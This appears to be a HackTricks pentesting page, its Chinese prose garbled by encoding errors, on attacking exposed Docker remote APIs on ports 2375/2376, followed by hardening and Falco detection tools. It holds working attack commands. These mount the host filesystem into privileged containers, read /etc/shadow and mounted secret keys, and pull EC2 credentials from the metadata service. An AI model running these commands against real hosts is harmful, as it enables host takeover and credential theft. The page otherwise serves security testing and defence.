# 2375, 2376 Pentesting Docker

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

- å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
- è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
- æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[NFTs](https://opensea.io/collection/the-peass-family)æ”¶è—å“
- **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
- é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

### [WhiteIntel](https://whiteintel.io)

<figure><img src="/.gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io)æ˜¯ä¸€ä¸ªç”±**æš—ç½‘**æ”¯æŒçš„æœç´¢å¼•æ“ï¼Œæä¾›å…è´¹åŠŸèƒ½ï¼Œç”¨äºæ£€æŸ¥å…¬å¸æˆ–å…¶å®¢æˆ·æ˜¯å¦å—åˆ°**çªƒå–æ¶æ„è½¯ä»¶**çš„**ä¾µå®³**ã€‚

WhiteIntelçš„ä¸»è¦ç›®æ ‡æ˜¯æ‰“å‡»ç”±ä¿¡æ¯çªƒå–æ¶æ„è½¯ä»¶å¯¼è‡´çš„è´¦æˆ·åŠ«æŒå’Œå‹’ç´¢è½¯ä»¶æ”»å‡»ã€‚

æ‚¨å¯ä»¥è®¿é—®ä»–ä»¬çš„ç½‘ç«™å¹¶å…è´¹å°è¯•ä»–ä»¬çš„å¼•æ“ï¼š

{% embed url="https://whiteintel.io" %}

---

### DockeråŸºç¡€çŸ¥è¯†

#### ä»€ä¹ˆæ˜¯Docker

Dockeræ˜¯**å®¹å™¨åŒ–è¡Œä¸š**ä¸­çš„**å‰æ²¿å¹³å°**ï¼Œå¼•é¢†**æŒç»­åˆ›æ–°**ã€‚å®ƒä¾¿äºåˆ›å»ºå’Œåˆ†å‘åº”ç”¨ç¨‹åºï¼Œæ¶µç›–**ä¼ ç»Ÿåˆ°æœªæ¥**çš„èŒƒå›´ï¼Œå¹¶ç¡®ä¿å®ƒä»¬åœ¨ä¸åŒç¯å¢ƒä¸­çš„**å®‰å…¨éƒ¨ç½²**ã€‚

#### åŸºæœ¬Dockeræ¶æ„

- [**containerd**](http://containerd.io)ï¼šè¿™æ˜¯å®¹å™¨çš„**æ ¸å¿ƒè¿è¡Œæ—¶**ï¼Œè´Ÿè´£å…¨é¢**ç®¡ç†å®¹å™¨çš„ç”Ÿå‘½å‘¨æœŸ**ã€‚è¿™åŒ…æ‹¬å¤„ç†**é•œåƒä¼ è¾“å’Œå­˜å‚¨**ï¼Œä»¥åŠç›‘è§†å’Œç½‘ç»œå®¹å™¨çš„**æ‰§è¡Œ**ã€‚å¯¹containerdçš„**æ›´è¯¦ç»†è§è§£**å°†**è¿›ä¸€æ­¥æ¢è®¨**ã€‚
- **container-shim**åœ¨å¤„ç†**æ— å¤´å®¹å™¨**æ—¶å‘æŒ¥å…³é”®ä½œç”¨ï¼Œå®ƒåœ¨å®¹å™¨åˆå§‹åŒ–åæ— ç¼æ¥ç®¡**runc**çš„å·¥ä½œã€‚
- [**runc**](http://runc.io)ï¼šä»¥å…¶**è½»é‡çº§å’Œé€šç”¨å®¹å™¨è¿è¡Œæ—¶**åŠŸèƒ½è€Œé—»åï¼Œruncç¬¦åˆ**OCIæ ‡å‡†**ã€‚å®ƒç”±containerdç”¨äºæ ¹æ®**OCIæŒ‡å—**å¯åŠ¨å’Œç®¡ç†å®¹å™¨ï¼Œä»æœ€åˆçš„**libcontainer**å‘å±•è€Œæ¥ã€‚
- [**grpc**](http://www.grpc.io)å¯¹äºåœ¨containerdå’Œ**docker-engine**ä¹‹é—´**ä¿ƒè¿›é€šä¿¡**è‡³å…³é‡è¦ï¼Œç¡®ä¿**é«˜æ•ˆäº’åŠ¨**ã€‚
- [**OCI**](https://www.opencontainers.org)åœ¨ç»´æŠ¤è¿è¡Œæ—¶å’Œé•œåƒçš„**OCIè§„èŒƒ**æ–¹é¢è‡³å…³é‡è¦ï¼Œæœ€æ–°çš„Dockerç‰ˆæœ¬ç¬¦åˆ**OCIé•œåƒå’Œè¿è¡Œæ—¶**æ ‡å‡†ã€‚ 

#### åŸºæœ¬å‘½ä»¤
```bash
docker version #Get version of docker client, API, engine, containerd, runc, docker-init
docker info #Get more infomarion about docker settings
docker pull registry:5000/alpine #Download the image
docker inspect <containerid> #Get info of the contaienr
docker network ls #List network info
docker exec -it <containerid> /bin/sh #Get shell inside a container
docker commit <cotainerid> registry:5000/name-container #Update container
docker export -o alpine.tar <containerid> #Export container as tar file
docker save -o ubuntu.tar <image> #Export an image
docker ps -a #List running and stopped containers
docker stop <containedID> #Stop running container
docker rm <containerID> #Remove container ID
docker image ls #List images
docker rmi <imgeID> #Remove image
docker system prune -a
#This will remove:
#  - all stopped containers
#  - all networks not used by at least one container
#  - all images without at least one container associated to them
#  - all build cache
```
#### Containerd

**Containerd**æ˜¯ä¸“é—¨ä¸ºåƒ**Dockerå’ŒKubernetes**ç­‰å®¹å™¨å¹³å°å¼€å‘çš„ã€‚å®ƒæ—¨åœ¨é€šè¿‡æŠ½è±¡æ“ä½œç³»ç»Ÿç‰¹å®šåŠŸèƒ½å’Œç³»ç»Ÿè°ƒç”¨ï¼Œç®€åŒ–åœ¨å„ç§æ“ä½œç³»ç»Ÿï¼ˆåŒ…æ‹¬Linuxã€Windowsã€Solarisç­‰ï¼‰ä¸Šæ‰§è¡Œå®¹å™¨çš„è¿‡ç¨‹ã€‚Containerdçš„ç›®æ ‡æ˜¯ä»…åŒ…å«å…¶ç”¨æˆ·æ‰€éœ€çš„åŸºæœ¬åŠŸèƒ½ï¼ŒåŠ›æ±‚çœç•¥ä¸å¿…è¦çš„ç»„ä»¶ã€‚ç„¶è€Œï¼Œå®Œå…¨å®ç°è¿™ä¸€ç›®æ ‡è¢«è®¤ä¸ºæ˜¯å…·æœ‰æŒ‘æˆ˜æ€§çš„ã€‚

ä¸€ä¸ªå…³é”®çš„è®¾è®¡å†³ç­–æ˜¯**Containerdä¸å¤„ç†ç½‘ç»œ**ã€‚ç½‘ç»œè¢«è®¤ä¸ºæ˜¯åˆ†å¸ƒå¼ç³»ç»Ÿä¸­çš„ä¸€ä¸ªå…³é”®å…ƒç´ ï¼Œå…·æœ‰è¯¸å¦‚è½¯ä»¶å®šä¹‰ç½‘ç»œï¼ˆSDNï¼‰å’ŒæœåŠ¡å‘ç°ç­‰å¤æ‚æ€§ï¼Œè¿™äº›å¤æ‚æ€§åœ¨ä¸åŒå¹³å°ä¹‹é—´å·®å¼‚å¾ˆå¤§ã€‚å› æ­¤ï¼ŒContainerdå°†ç½‘ç»œæ–¹é¢çš„ç®¡ç†ç•™ç»™äº†å®ƒæ”¯æŒçš„å¹³å°ã€‚

è™½ç„¶**Dockeråˆ©ç”¨Containerd**æ¥è¿è¡Œå®¹å™¨ï¼Œä½†é‡è¦çš„æ˜¯è¦æ³¨æ„ï¼ŒContainerdä»…æ”¯æŒDockeråŠŸèƒ½çš„å­é›†ã€‚å…·ä½“æ¥è¯´ï¼ŒContainerdç¼ºä¹Dockerä¸­å­˜åœ¨çš„ç½‘ç»œç®¡ç†åŠŸèƒ½ï¼Œå¹¶ä¸”ä¸ç›´æ¥æ”¯æŒåˆ›å»ºDocker swarmsã€‚è¿™ç§åŒºåˆ«çªæ˜¾äº†Containerdä½œä¸ºå®¹å™¨è¿è¡Œæ—¶ç¯å¢ƒçš„ä¸“æ³¨è§’è‰²ï¼Œå°†æ›´ä¸“ä¸šçš„åŠŸèƒ½å§”æ‰˜ç»™å…¶é›†æˆçš„å¹³å°ã€‚
```bash
#Containerd CLI
ctr images pull --skip-verify --plain-http registry:5000/alpine:latest #Get image
ctr images list #List images
ctr container create registry:5000/alpine:latest alpine #Create container called alpine
ctr container list #List containers
ctr container info <containerName> #Get container info
ctr task start <containerName> #You are given a shell inside of it
ctr task list #Get status of containers
ctr tasks attach <containerName> #Get shell in running container
ctr task pause <containerName> #Stop container
ctr tasks resume <containerName> #Resume cotainer
ctr task kill -s SIGKILL <containerName> #Stop running container
ctr container delete <containerName>
```
#### Podman

**Podman** æ˜¯ä¸€ä¸ªéµå¾ª[å¼€æ”¾å®¹å™¨å€¡è®®ï¼ˆOCIï¼‰æ ‡å‡†](https://github.com/opencontainers)çš„å¼€æºå®¹å™¨å¼•æ“ï¼Œç”± Red Hat å¼€å‘å’Œç»´æŠ¤ã€‚å®ƒä¸ Docker æœ‰å‡ ä¸ªæ˜æ˜¾çš„ç‰¹ç‚¹ä¸åŒï¼Œå°¤å…¶æ˜¯å…¶**æ— å®ˆæŠ¤ç¨‹åºæ¶æ„**å’Œå¯¹**æ— æ ¹æƒé™å®¹å™¨**çš„æ”¯æŒï¼Œä½¿ç”¨æˆ·èƒ½å¤Ÿåœ¨æ— éœ€ root æƒé™çš„æƒ…å†µä¸‹è¿è¡Œå®¹å™¨ã€‚

Podman çš„è®¾è®¡æ—¨åœ¨ä¸ Docker çš„ API å…¼å®¹ï¼Œå…è®¸ä½¿ç”¨ Docker CLI å‘½ä»¤ã€‚è¿™ç§å…¼å®¹æ€§å»¶ä¼¸åˆ°å…¶ç”Ÿæ€ç³»ç»Ÿï¼Œå…¶ä¸­åŒ…æ‹¬è¯¸å¦‚**Buildah**ï¼ˆç”¨äºæ„å»ºå®¹å™¨é•œåƒï¼‰å’Œ**Skopeo**ï¼ˆç”¨äºæ¨é€ã€æ‹‰å–å’Œæ£€æŸ¥é•œåƒç­‰æ“ä½œï¼‰ç­‰å·¥å…·ã€‚æœ‰å…³è¿™äº›å·¥å…·çš„æ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚é˜…å®ƒä»¬çš„[GitHub é¡µé¢](https://github.com/containers/buildah/tree/master/docs/containertools)ã€‚

**ä¸»è¦åŒºåˆ«**

- **æ¶æ„**ï¼šä¸ Docker çš„å®¢æˆ·ç«¯-æœåŠ¡å™¨æ¨¡å‹åŠåå°å®ˆæŠ¤ç¨‹åºä¸åŒï¼ŒPodman æ— éœ€å®ˆæŠ¤ç¨‹åºè¿è¡Œã€‚è¿™ç§è®¾è®¡æ„å‘³ç€å®¹å™¨ä»¥å¯åŠ¨å®ƒä»¬çš„ç”¨æˆ·çš„æƒé™è¿è¡Œï¼Œé€šè¿‡æ¶ˆé™¤å¯¹ root è®¿é—®æƒé™çš„éœ€æ±‚æ¥å¢å¼ºå®‰å…¨æ€§ã€‚
- **Systemd é›†æˆ**ï¼šPodman ä¸ **systemd** é›†æˆä»¥ç®¡ç†å®¹å™¨ï¼Œå…è®¸é€šè¿‡ systemd å•å…ƒè¿›è¡Œå®¹å™¨ç®¡ç†ã€‚è¿™ä¸ Docker ä¸»è¦ç”¨äºç®¡ç† Docker å®ˆæŠ¤ç¨‹åºè¿›ç¨‹çš„ systemd çš„ç”¨æ³•å½¢æˆå¯¹æ¯”ã€‚
- **æ— æ ¹æƒé™å®¹å™¨**ï¼šPodman çš„ä¸€ä¸ªå…³é”®ç‰¹ç‚¹æ˜¯èƒ½å¤Ÿä»¥å¯åŠ¨ç”¨æˆ·çš„æƒé™è¿è¡Œå®¹å™¨ã€‚è¿™ç§æ–¹æ³•é€šè¿‡ç¡®ä¿æ”»å‡»è€…ä»…è·å¾—å—æŸç”¨æˆ·çš„æƒé™è€Œé root è®¿é—®æƒé™ï¼Œæœ€å°åŒ–äº†ä¸å®¹å™¨å…¥ä¾µç›¸å…³çš„é£é™©ã€‚

Podman çš„æ–¹æ³•ä¸º Docker æä¾›äº†ä¸€ä¸ªå®‰å…¨çµæ´»çš„æ›¿ä»£æ–¹æ¡ˆï¼Œå¼ºè°ƒç”¨æˆ·æƒé™ç®¡ç†å’Œä¸ç°æœ‰ Docker å·¥ä½œæµçš„å…¼å®¹æ€§ã€‚

{% hint style="info" %}
è¯·æ³¨æ„ï¼Œç”±äº Podman æ—¨åœ¨æ”¯æŒä¸ Docker ç›¸åŒçš„ APIï¼Œæ‚¨å¯ä»¥åƒåœ¨ Docker ä¸­ä¸€æ ·ä½¿ç”¨ Podmanï¼Œä¾‹å¦‚ï¼š
```bash
podman --version
podman info
pdoman images ls
podman ls
```
{% endhint %}

### åŸºæœ¬ä¿¡æ¯

å½“å¯ç”¨æ—¶ï¼Œé»˜è®¤æƒ…å†µä¸‹è¿œç¨‹ API åœ¨ 2375 ç«¯å£ä¸Šè¿è¡Œã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œè¯¥æœåŠ¡ä¸éœ€è¦èº«ä»½éªŒè¯ï¼Œå…è®¸æ”»å‡»è€…å¯åŠ¨ä¸€ä¸ªç‰¹æƒçš„ Docker å®¹å™¨ã€‚é€šè¿‡ä½¿ç”¨è¿œç¨‹ APIï¼Œå¯ä»¥å°†ä¸»æœº/ï¼ˆæ ¹ç›®å½•ï¼‰é™„åŠ åˆ°å®¹å™¨ï¼Œå¹¶è¯»å–/å†™å…¥ä¸»æœºç¯å¢¶çš„æ–‡ä»¶ã€‚

**é»˜è®¤ç«¯å£:** 2375
```
PORT    STATE SERVICE
2375/tcp open  docker
```
### æšä¸¾

#### æ‰‹åŠ¨

è¯·æ³¨æ„ï¼Œè¦æšä¸¾docker APIï¼Œæ‚¨å¯ä»¥ä½¿ç”¨`docker`å‘½ä»¤æˆ–`curl`ï¼Œå°±åƒä»¥ä¸‹ç¤ºä¾‹ä¸­æ‰€ç¤ºï¼š
```bash
#Using curl
curl -s http://open.docker.socket:2375/version | jq #Get version
{"Platform":{"Name":"Docker Engine - Community"},"Components":[{"Name":"Engine","Version":"19.03.1","Details":{"ApiVersion":"1.40","Arch":"amd64","BuildTime":"2019-07-25T21:19:41.000000000+00:00","Experimental":"false","GitCommit":"74b1e89","GoVersion":"go1.12.5","KernelVersion":"5.0.0-20-generic","MinAPIVersion":"1.12","Os":"linux"}},{"Name":"containerd","Version":"1.2.6","Details":{"GitCommit":"894b81a4b802e4eb2a91d1ce216b8817763c29fb"}},{"Name":"runc","Version":"1.0.0-rc8","Details":{"GitCommit":"425e105d5a03fabd737a126ad93d62a9eeede87f"}},{"Name":"docker-init","Version":"0.18.0","Details":{"GitCommit":"fec3683"}}],"Version":"19.03.1","ApiVersion":"1.40","MinAPIVersion":"1.12","GitCommit":"74b1e89","GoVersion":"go1.12.5","Os":"linux","Arch":"amd64","KernelVersion":"5.0.0-20-generic","BuildTime":"2019-07-25T21:19:41.000000000+00:00"}

#Using docker
docker -H open.docker.socket:2375 version #Get version
Client: Docker Engine - Community
Version:           19.03.1
API version:       1.40
Go version:        go1.12.5
Git commit:        74b1e89
Built:             Thu Jul 25 21:21:05 2019
OS/Arch:           linux/amd64
Experimental:      false

Server: Docker Engine - Community
Engine:
Version:          19.03.1
API version:      1.40 (minimum version 1.12)
Go version:       go1.12.5
Git commit:       74b1e89
Built:            Thu Jul 25 21:19:41 2019
OS/Arch:          linux/amd64
Experimental:     false
containerd:
Version:          1.2.6
GitCommit:        894b81a4b802e4eb2a91d1ce216b8817763c29fb
runc:
Version:          1.0.0-rc8
GitCommit:        425e105d5a03fabd737a126ad93d62a9eeede87f
docker-init:
Version:          0.18.0
GitCommit:        fec3683
```
å¦‚æœæ‚¨å¯ä»¥ä½¿ç”¨`docker`å‘½ä»¤**è”ç³»è¿œç¨‹docker API**ï¼Œæ‚¨å¯ä»¥æ‰§è¡Œä»»ä½•åœ¨[**ä¹‹å‰è¯„è®ºè¿‡çš„dockerå‘½ä»¤**](2375-pentesting-docker.md#basic-commands)æ¥ä¸æœåŠ¡è¿›è¡Œäº¤äº’ã€‚

{% hint style="info" %}
æ‚¨å¯ä»¥`export DOCKER_HOST="tcp://localhost:2375"`ï¼Œ**é¿å…**åœ¨dockerå‘½ä»¤ä¸­ä½¿ç”¨`-H`å‚æ•°
{% endhint %}

**å¿«é€Ÿææƒ**
```bash
docker run -it -v /:/host/ ubuntu:latest chroot /host/ bash
```
**Curl**

æœ‰æ—¶ä½ ä¼šçœ‹åˆ° **2376** å¼€æ”¾åœ¨ **TLS** ç«¯ç‚¹ä¸Šã€‚æˆ‘æ— æ³•ç”¨ docker å®¢æˆ·ç«¯è¿æ¥åˆ°å®ƒï¼Œä½†å¯ä»¥ä½¿ç”¨ curl è¿æ¥ã€‚
```bash
#List containers
curl â€“insecure https://tlsopen.docker.socket:2376/containers/json | jq
#List processes inside a container
curl â€“insecure https://tlsopen.docker.socket:2376/containers/f9cecac404b01a67e38c6b4111050c86bbb53d375f9cca38fa73ec28cc92c668/top | jq
#Set up and exec job to hit the metadata URL
curl â€“insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/blissful_engelbart/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "wget -qO- http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance"]}'
#Get the output
curl â€“insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/exec/4353567ff39966c4d231e936ffe612dbb06e1b7dd68a676ae1f0a9c9c0662d55/start -d '{}'
# list secrets (no secrets/swarm not set up)
curl -s â€“insecure https://tlsopen.docker.socket:2376/secrets | jq
#Check what is mounted
curl â€“insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/e280bd8c8feaa1f2c82cabbfa16b823f4dd42583035390a00ae4dce44ffc7439/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "mount"]}'
#Get the output by starting the exec
curl â€“insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/exec/7fe5c7d9c2c56c2b2e6c6a1efe1c757a6da1cd045d9b328ea9512101f72e43aa/start -d '{}'
#Cat the mounted secret
curl â€“insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/e280bd8c8feaa1f2c82cabbfa16b823f4dd42583035390a00ae4dce44ffc7439/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "cat /run/secrets/registry-key.key"]}'
#List service (If you have secrets, itâ€™s also worth checking out services in case they are adding secrets via environment variables)
curl -s â€“insecure https://tls-opendocker.socket:2376/services | jq
#Creating a container that has mounted the host file system and read /etc/shadow
curl â€“insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket2376/containers/create?name=test -d '{"Image":"alpine", "Cmd":["/usr/bin/tail", "-f", "1234", "/dev/null"], "Binds": [ "/:/mnt" ], "Privileged": true}'
curl â€“insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/start?name=test
curl â€“insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "cat /mnt/etc/shadow"]}'
curl â€“insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/exec/140e09471b157aa222a5c8783028524540ab5a55713cbfcb195e6d5e9d8079c6/start -d '{}'
#Stop the container
curl â€“insecure -vv -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/stop
#Delete stopped containers
curl â€“insecure -vv -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/prune
```
å¦‚æœæ‚¨æƒ³è·å–æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹æˆ‘å¤åˆ¶å‘½ä»¤çš„åœ°æ–¹ï¼š[https://securityboulevard.com/2019/02/abusing-docker-api-socket/](https://securityboulevard.com/2019/02/abusing-docker-api-socket/)

#### è‡ªåŠ¨åŒ–
```bash
msf> use exploit/linux/http/docker_daemon_tcp
nmap -sV --script "docker-*" -p <PORT> <IP>
```
### Compromising

åœ¨ä»¥ä¸‹é¡µé¢ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°**ä» Docker å®¹å™¨ä¸­é€ƒè„±**çš„æ–¹æ³•ï¼š

{% content-ref url="../linux-hardening/privilege-escalation/docker-security/" %}
[docker-security](../linux-hardening/privilege-escalation/docker-security/)
{% endcontent-ref %}

æ»¥ç”¨è¿™ä¸€ç‚¹ï¼Œå¯ä»¥ä»å®¹å™¨ä¸­é€ƒè„±ï¼Œæ‚¨å¯ä»¥åœ¨è¿œç¨‹æœºå™¨ä¸Šè¿è¡Œä¸€ä¸ªå¼±å®¹å™¨ï¼Œä»ä¸­é€ƒè„±ï¼Œå¹¶å¨èƒåˆ°æœºå™¨ï¼š
```bash
docker -H <host>:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
cat /mnt/etc/shadow
```
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Docker%20API%20RCE.py](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Docker%20API%20RCE.py)

### ææƒ

å¦‚æœæ‚¨åœ¨ä½¿ç”¨ Docker çš„ä¸»æœºå†…éƒ¨ï¼Œæ‚¨å¯ä»¥[**é˜…è¯»æ­¤ä¿¡æ¯å°è¯•æå‡æƒé™**](../linux-hardening/privilege-escalation/#writable-docker-socket)ã€‚

### åœ¨è¿è¡Œä¸­çš„ Docker å®¹å™¨ä¸­å‘ç°ç§˜å¯†
```bash
docker ps [| grep <kubernetes_service_name>]
docker inspect <docker_id>
```
æ£€æŸ¥ **env**ï¼ˆç¯å¢ƒå˜é‡éƒ¨åˆ†ï¼‰ä»¥æŸ¥æ‰¾ç§˜å¯†ä¿¡æ¯ï¼Œå¯èƒ½ä¼šå‘ç°ï¼š

* å¯†ç ã€‚
* IP åœ°å€ã€‚
* ç«¯å£ã€‚
* è·¯å¾„ã€‚
* å…¶ä»–â€¦ .

å¦‚æœè¦æå–æ–‡ä»¶ï¼š
```bash
docker cp <docket_id>:/etc/<secret_01> <secret_01>
```
### ä¿æŠ¤æ‚¨çš„Docker

#### ä¿æŠ¤Dockerå®‰è£…å’Œä½¿ç”¨

* æ‚¨å¯ä»¥ä½¿ç”¨å·¥å…·[https://github.com/docker/docker-bench-security](https://github.com/docker/docker-bench-security)æ¥æ£€æŸ¥æ‚¨å½“å‰çš„Dockerå®‰è£…ã€‚
* `./docker-bench-security.sh`
* æ‚¨å¯ä»¥ä½¿ç”¨å·¥å…·[https://github.com/kost/dockscan](https://github.com/kost/dockscan)æ¥æ£€æŸ¥æ‚¨å½“å‰çš„Dockerå®‰è£…ã€‚
* `dockscan -v unix:///var/run/docker.sock`
* æ‚¨å¯ä»¥ä½¿ç”¨å·¥å…·[https://github.com/genuinetools/amicontained](https://github.com/genuinetools/amicontained)æ¥æŸ¥çœ‹ä»¥ä¸åŒå®‰å…¨é€‰é¡¹è¿è¡Œæ—¶å®¹å™¨å°†å…·æœ‰çš„ç‰¹æƒã€‚è¿™å¯¹äºäº†è§£ä½¿ç”¨æŸäº›å®‰å…¨é€‰é¡¹è¿è¡Œå®¹å™¨çš„å½±å“å¾ˆæœ‰ç”¨ï¼š
* `docker run --rm -it r.j3ss.co/amicontained`
* `docker run --rm -it --pid host r.j3ss.co/amicontained`
* `docker run --rm -it --security-opt "apparmor=unconfined" r.j3ss.co/amicontained`

#### ä¿æŠ¤Dockeré•œåƒ

* æ‚¨å¯ä»¥ä½¿ç”¨[https://github.com/quay/clair](https://github.com/quay/clair)çš„Dockeré•œåƒæ¥æ‰«ææ‚¨çš„å…¶ä»–Dockeré•œåƒå¹¶æŸ¥æ‰¾æ¼æ´ã€‚
* `docker run --rm -v /root/clair_config/:/config -p 6060-6061:6060-6061 -d clair -config="/config/config.yaml"`
* `clair-scanner -c http://172.17.0.3:6060 --ip 172.17.0.1 ubuntu-image`

#### ä¿æŠ¤Dockerfiles

* æ‚¨å¯ä»¥ä½¿ç”¨å·¥å…·[https://github.com/buddy-works/dockerfile-linter](https://github.com/buddy-works/dockerfile-linter)æ¥**æ£€æŸ¥æ‚¨çš„Dockerfile**å¹¶æ‰¾åˆ°å„ç§é…ç½®é”™è¯¯ã€‚æ¯ä¸ªé…ç½®é”™è¯¯éƒ½å°†è¢«èµ‹äºˆä¸€ä¸ªIDï¼Œæ‚¨å¯ä»¥åœ¨[https://github.com/buddy-works/dockerfile-linter/blob/master/Rules.md](https://github.com/buddy-works/dockerfile-linter/blob/master/Rules.md)æ‰¾åˆ°å¦‚ä½•ä¿®å¤æ¯ä¸ªé”™è¯¯ã€‚
* `dockerfilelinter -f Dockerfile`

![](<../.gitbook/assets/image (173).png>)

* æ‚¨å¯ä»¥ä½¿ç”¨å·¥å…·[https://github.com/replicatedhq/dockerfilelint](https://github.com/replicatedhq/dockerfilelint)æ¥**æ£€æŸ¥æ‚¨çš„Dockerfile**å¹¶æ‰¾åˆ°å„ç§é…ç½®é”™è¯¯ã€‚
* `dockerfilelint Dockerfile`

![](<../.gitbook/assets/image (209).png>)

* æ‚¨å¯ä»¥ä½¿ç”¨å·¥å…·[https://github.com/RedCoolBeans/dockerlint](https://github.com/RedCoolBeans/dockerlint)æ¥**æ£€æŸ¥æ‚¨çš„Dockerfile**å¹¶æ‰¾åˆ°å„ç§é…ç½®é”™è¯¯ã€‚
* `dockerlint Dockerfile`

![](<../.gitbook/assets/image (68).png>)

* æ‚¨å¯ä»¥ä½¿ç”¨å·¥å…·[https://github.com/hadolint/hadolint](https://github.com/hadolint/hadolint)æ¥**æ£€æŸ¥æ‚¨çš„Dockerfile**å¹¶æ‰¾åˆ°å„ç§é…ç½®é”™è¯¯ã€‚
* `hadolint Dockerfile`

![](<../.gitbook/assets/image (498).png>)

#### è®°å½•å¯ç–‘æ´»åŠ¨

* æ‚¨å¯ä»¥ä½¿ç”¨å·¥å…·[https://github.com/falcosecurity/falco](https://github.com/falcosecurity/falco)æ¥æ£€æµ‹**è¿è¡Œå®¹å™¨ä¸­çš„å¯ç–‘è¡Œä¸º**ã€‚
* è¯·æ³¨æ„ä¸‹é¢çš„ä»£ç å—ä¸­**Falcoå¦‚ä½•ç¼–è¯‘å†…æ ¸æ¨¡å—å¹¶æ’å…¥**ã€‚ä¹‹åï¼Œå®ƒåŠ è½½è§„åˆ™å¹¶**å¼€å§‹è®°å½•å¯ç–‘æ´»åŠ¨**ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå®ƒæ£€æµ‹åˆ°å¯åŠ¨äº†2ä¸ªç‰¹æƒå®¹å™¨ï¼Œå…¶ä¸­ä¸€ä¸ªå¸¦æœ‰æ•æ„ŸæŒ‚è½½ç‚¹ï¼Œå‡ ç§’é’Ÿåæ£€æµ‹åˆ°ä¸€ä¸ªå®¹å™¨å†…æ‰“å¼€äº†ä¸€ä¸ªshellã€‚
```bash
docker run -it --privileged -v /var/run/docker.sock:/host/var/run/docker.sock -v /dev:/host/dev -v /proc:/host/proc:ro -v /boot:/host/boot:ro -v /lib/modules:/host/lib/modules:ro -v /usr:/host/usr:ro falco
* Setting up /usr/src links from host
* Unloading falco-probe, if present
* Running dkms install for falco

Kernel preparation unnecessary for this kernel.  Skipping...

Building module:
cleaning build area......
make -j3 KERNELRELEASE=5.0.0-20-generic -C /lib/modules/5.0.0-20-generic/build M=/var/lib/dkms/falco/0.18.0/build.............
cleaning build area......

DKMS: build completed.

falco-probe.ko:
Running module version sanity check.
modinfo: ERROR: missing module or filename.
- Original module
- No original module exists within this kernel
- Installation
- Installing to /lib/modules/5.0.0-20-generic/kernel/extra/
mkdir: cannot create directory '/lib/modules/5.0.0-20-generic/kernel/extra': Read-only file system
cp: cannot create regular file '/lib/modules/5.0.0-20-generic/kernel/extra/falco-probe.ko': No such file or directory

depmod...

DKMS: install completed.
* Trying to load a dkms falco-probe, if present
falco-probe found and loaded in dkms
2021-01-04T12:03:20+0000: Falco initialized with configuration file /etc/falco/falco.yaml
2021-01-04T12:03:20+0000: Loading rules from file /etc/falco/falco_rules.yaml:
2021-01-04T12:03:22+0000: Loading rules from file /etc/falco/falco_rules.local.yaml:
2021-01-04T12:03:22+0000: Loading rules from file /etc/falco/k8s_audit_rules.yaml:
2021-01-04T12:03:24+0000: Starting internal webserver, listening on port 8765
2021-01-04T12:03:24.646959000+0000: Notice Privileged container started (user=<NA> command=container:db5dfd1b6a32 laughing_kowalevski (id=db5dfd1b6a32) image=ubuntu:18.04)
